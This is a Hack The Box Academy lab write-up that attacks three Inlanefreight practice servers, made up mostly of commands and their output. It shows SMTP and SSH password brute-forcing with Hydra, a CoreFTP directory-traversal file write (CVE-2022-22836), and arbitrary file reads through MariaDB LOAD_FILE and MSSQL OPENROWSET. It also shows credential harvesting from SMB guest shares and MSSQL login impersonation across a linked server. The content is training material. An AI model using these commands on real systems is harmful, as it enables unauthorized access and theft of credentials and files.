# [Attacking Common Services](https://academy.hackthebox.com/module/details/116)

## Skills Assessment - Attacking Common Services

### Attacking Common Services - Easy

> We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: `HTB{...}`.
> Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

Questions:
1. You are targeting the `inlanefreight.htb` domain. Assess the target server and obtain the contents of the `flag.txt` file. Submit it as the answer. `HTB{t**********************************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sS -p- 10.129.183.247 -T5

[SNIP]

PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
80/tcp   open  http
443/tcp  open  https
587/tcp  open  submission
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
```

#### SMTP Enumeration

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sSVC -p25 10.129.183.247 -T5

[SNIP]

PORT   STATE SERVICE VERSION
25/tcp open  smtp    hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

```
┌──(nabla㉿kali)-[~]
└─$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.183.247 -w 100

[SNIP]

10.129.183.247: fiona@inlanefreight.htb exists
1 results.
```

#### SMTP Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt -f 10.129.183.247 smtp

[SNIP]

[25][smtp] host: 10.129.183.247   login: fiona@inlanefreight.htb   password: 987654321
```

```yaml
credentials:
    username: fiona
    password: '987654321'
    host: inlanefreight.htb
    port: 25,443,3306 (SMTP,HTTPS,MySQL)
```

#### HTTP/HTTPS Enumeration

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://10.129.183.247

http://10.129.183.247 [302 Found] Apache[2.4.53], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29], IP[10.129.183.247], OpenSSL[1.1.1n], PHP[7.4.29], RedirectLocation[http://10.129.183.247/dashboard/], X-Powered-By[PHP/7.4.29]

http://10.129.183.247/dashboard/ [200 OK] Apache[2.4.53], Country[RESERVED][ZZ], Email[fastly-logo@2x.png], HTML5, HTTPServer[Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29], IP[10.129.183.247], JQuery[1.10.2], Modernizr, OpenSSL[1.1.1n], PHP[7.4.29], Script[text/javascript], Title[Welcome to XAMPP]
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb https://10.129.183.247

https://10.129.183.247 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Core FTP HTTPS Server], IP[10.129.183.247], WWW-Authenticate[Restricted Area][Basic]
```

```
┌──(nabla㉿kali)-[~]
└─$ curl -s -k -X GET -H "Host: 10.129.183.247" --basic -u fiona:987654321 https://10.129.183.247/ | html2text

[Upload] [File]
            22 Apr 2022    10:07        <dir> .
            22 Apr 2022    10:07        <dir> ..
            21 Apr 2022    14:23        55 docs.txt
            22 Apr 2022    10:10        255 WebServersInfo.txt
```

```
┌──(nabla㉿kali)-[~]
└─$ curl -s -k -X GET -H "Host: 10.129.183.247" --basic -u fiona:987654321 https://10.129.183.247/WebServersInfo.txt

CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

#### FTP Enumeration

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sSVC -p21 10.129.183.247 -T5

[SNIP]

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
```

#### FTP Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ searchsploit --cve 2022-22836 --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'

{
  "Title": "CoreFTP Server build 725 - Directory Traversal (Authenticated)",
  "Codes": "CVE-2022-22836",
  "Path": "/usr/share/exploitdb/exploits/windows/remote/50652.txt"
}
```

```
┌──(nabla㉿kali)-[~]
└─$ curl -k -X PUT -H "Host: 10.129.183.247" --basic -u fiona:987654321 --data-binary "PoC." --path-as-is https://10.129.183.247/../../../../../../whoops

HTTP/1.1 200 Ok
Date:Tue, 22 Jun 2025 10:11:30 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 4
```

#### MySQL Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ mysql -h 10.129.183.247 -u fiona -p'987654321'

Server version: 10.4.24-MariaDB mariadb.org binary distribution

[SNIP]

MariaDB [none]> SELECT @@version_compile_os; 
+----------------------+
| @@version_compile_os |
+----------------------+
| Win64                |
+----------------------+

MariaDB [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

MariaDB [(none)]> SELECT LOAD_FILE("C:\\whoops");
+-------------------------+
| LOAD_FILE("C:\\whoops") |
+-------------------------+
| PoC.                    |
+-------------------------+

MariaDB [(none)]> SELECT LOAD_FILE("C:\xampp\apache\conf\httpd.conf");

+----------------------------------------------+
| LOAD_FILE("C:\xampp\apache\conf\httpd.conf") |
+----------------------------------------------+
| NULL                                         | ❌
+----------------------------------------------+

MariaDB [(none)]> SELECT LOAD_FILE('C:/Users/Administrator/Desktop/flag.txt');
+------------------------------------------------------+
| LOAD_FILE('C:/Users/Administrator/Desktop/flag.txt') |
+------------------------------------------------------+
| HTB{t**********************************              | 📌
+------------------------------------------------------+
```

---
---

### Attacking Common Services - Medium

> The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

Questions:
1. Assess the target server and find the `flag.txt` file. Submit the contents of this file as your answer. `HTB{1***********************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.129.201.127\tinlanefreight.htb' | sudo tee /etc/hosts

10.129.201.127	inlanefreight.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 10.129.201.127 -T5

[SNIP]

PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sSVC -p30021 10.129.201.127

[SNIP]

PORT      STATE SERVICE VERSION
30021/tcp open  ftp
| fingerprint-strings: 
|   SIPOptions: 
|_    220 ProFTPD Server (Internal FTP) [10.129.201.127]
```

#### FTP Enumeration/Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ ftp ftp://anonymous:anonymous@10.129.201.127:30021

Connected to 10.129.201.127.
220 ProFTPD Server (Internal FTP) [10.129.201.127]
331 Anonymous login ok, send your complete email address as your password
230 Anonymous access granted, restrictions apply

ftp> ls
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon

ftp> cd simon

ftp> ls
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt

ftp> get mynotes.txt
100% |**********************************************************************************************************|   153       76.19 KiB/s    00:00 ETA
226 Transfer complete

ftp> !cat mynotes.txt
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

#### SSH Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ hydra -l simon -P mynotes.txt ssh://10.129.201.127 -t 64

[SNIP]

[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```

```yaml
credentials:
    username: simon
    password: '8Ns8j1b!23hs4921smHzwn'
    host: inlanefreight.htb
    port: 22 (SSH)
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh simon@10.129.201.127

simon@10.129.201.127's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

[SNIP]

simon@lin-medium:~$ ls -l
total 8
-rw-r--r-- 1 root  root    29 Apr 20  2022 flag.txt
drwxrwxr-x 3 simon simon 4096 Apr 18  2022 Maildir

simon@lin-medium:~$ cat flag.txt
HTB{1*********************** 📌
```

---
---

### Attacking Common Services - Hard

> The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

Questions:
1. What file can you retrieve that belongs to the user `simon`? (Format: `filename.txt`). `random.txt`
2. Enumerate the target and find a password for the user `fiona`. What is her password? `48Ns72!bns74@S84NNNSl`
3. Once logged in, what other user can we compromise to gain admin privileges? `john`
4. Submit the contents of the `flag.txt` file on the `Administrator` desktop. `HTB{4**********************`

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 10.129.203.10 -T5

[SNIP]

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

#### SMB Enumeration

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb 10.129.203.10 -u 'guest' -p '' --shares

[SNIP]

SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\guest: 
SMB         10.129.203.10   445    WIN-HARD         [*] Enumerated shares
SMB         10.129.203.10   445    WIN-HARD         Share           Permissions     Remark
SMB         10.129.203.10   445    WIN-HARD         -----           -----------     ------
SMB         10.129.203.10   445    WIN-HARD         ADMIN$                          Remote Admin
SMB         10.129.203.10   445    WIN-HARD         C$                              Default share
SMB         10.129.203.10   445    WIN-HARD         Home            READ            
SMB         10.129.203.10   445    WIN-HARD         IPC$            READ            Remote IPC
```

#### SMB Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ smbclient -U guest%'' //10.129.203.10/Home

smb: \> ls
  .                                   D        0  Thu Apr 21 16:18:21 2022
  ..                                  D        0  Thu Apr 21 16:18:21 2022
  HR                                  D        0  Thu Apr 21 15:04:39 2022
  IT                                  D        0  Thu Apr 21 15:11:44 2022
  OPS                                 D        0  Thu Apr 21 15:05:10 2022
  Projects                            D        0  Thu Apr 21 15:04:48 2022
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb 10.129.203.10 -u guest -p '' -M spider_plus

[SNIP]

SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.129.203.10.json".
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] SMB Shares:           4 (ADMIN$, C$, Home, IPC$)
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] SMB Readable Shares:  2 (Home, IPC$)
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] Total folders found:  7
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] Total files found:    5
```

```
┌──(nabla㉿kali)-[~]
└─$ cat /tmp/nxc_hosted/nxc_spider_plus/10.129.203.10.json | jq '.Home | keys[]'

"IT/Fiona/creds.txt"
"IT/John/information.txt"
"IT/John/notes.txt"
"IT/John/secrets.txt"
"IT/Simon/random.txt" 📌
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb 10.129.203.10 -u guest -p '' --spider Home -M spider_plus -o DOWNLOAD_FLAG=True

[SNIP]

SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [*] Downloads successful: 5
SPIDER_PLUS 10.129.203.10   445    WIN-HARD         [+] All files processed successfully.
```

```
┌──(nabla㉿kali)-[~]
└─$ tree /tmp/nxc_hosted/nxc_spider_plus/10.129.203.10/Home/IT

/tmp/nxc_hosted/nxc_spider_plus/10.129.203.10/Home/IT
├── Fiona
│   └── creds.txt
├── John
│   ├── information.txt
│   ├── notes.txt
│   └── secrets.txt
└── Simon
    └── random.txt
```

```
┌──(nabla㉿kali)-[~]
└─$ cat /tmp/nxc_hosted/nxc_spider_plus/10.129.203.10/Home/IT/Fiona/creds.txt 

Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

#### MSSQL Enumeration

```
┌──(nabla㉿kali)-[~]
└─$ netexec mssql 10.129.203.10 -u fiona -p '48Ns72!bns74@S84NNNSl'

[SNIP]

MSSQL       10.129.203.10   1433   WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl 📌
```

```yaml
credentials:
    username: fiona
    password: '48Ns72!bns74@S84NNNSl'
    host: 10.129.203.10
    port: 445,1433,3389 (SMB,MSSQL,RDP)
```

#### MSSQL Exploitation

```
┌──(nabla㉿kali)-[~]
└─$ impacket-mssqlclient fiona:'48Ns72!bns74@S84NNNSl'@10.129.203.10 -windows-auth

[SNIP]

[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 

SQL (WIN-HARD\Fiona  guest@master)> SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name
-----
john 📌
simon

SQL (WIN-HARD\Fiona  guest@master)> SELECT SYSTEM_USER;
--------------
WIN-HARD\Fiona

SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'john';

SQL (john  guest@master)> SELECT SYSTEM_USER;
----  
john

SQL (john  guest@master)> SELECT srvname,isremote FROM sysservers;
srvname                 isremote
---------------------   --------
WINSRV02\SQLEXPRESS            1
LOCAL.TEST.LINKED.SRV          0

SQL (john  guest@master)> EXECUTE('select @@servername,@@version,system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];

SQL (john  guest@master)> EXECUTE ('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV];
BulkColumn                       
------------------------------   
b'HTB{4**********************' 📌
```

---
---
